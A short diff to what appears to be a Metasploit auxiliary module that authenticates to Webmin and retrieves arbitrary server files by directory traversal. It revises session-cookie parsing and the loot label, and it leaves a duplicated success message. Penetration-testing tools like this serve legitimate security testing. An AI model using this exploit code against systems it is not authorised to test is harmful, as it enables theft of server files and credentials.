@@ -71,8 +71,14 @@ class Metasploit3 < Msf::Auxiliary
 			}, 25)
 
 		if res and res.code == 302 and res.headers['Set-Cookie'] =~ /sid/
+			session = res.headers['Set-Cookie'].scan(/sid\=(\w+)\;*/).flatten[0] || ''
+			if session and not session.empty?
+				print_good "#{peer} - Authentication successfully"
+			else
+				print_error "#{peer} - Authentication failed"
+				return
+			end
 			print_good "#{peer} - Authentication successfully"
-			session = res.headers['Set-Cookie'].split("sid=")[1].split(";")[0]
 		else
 			print_error "#{peer} - Authentication failed"
 			return
@@ -94,8 +100,8 @@ class Metasploit3 < Msf::Auxiliary
 		if (res and res.code == 200 and res.body =~ /#{traversal}/ and res.body =~ /name=body>(.*)<\/textarea>/m)
 			loot = $1
 			f = ::File.basename(datastore['RPATH'])
-			path = store_loot('atlassian.crowd.file', 'application/octet-stream', rhost, loot, f, datastore['RPATH'])
-			print_status("#{rhost}:#{rport} - #{datastore['RPATH']} saved in #{path}")
+			path = store_loot('webmin.file', 'application/octet-stream', rhost, loot, f, datastore['RPATH'])
+			print_status("#{peer} - #{datastore['RPATH']} saved in #{path}")
 		else
 			print_error("#{peer} - Failed to retrieve the file")
 			return
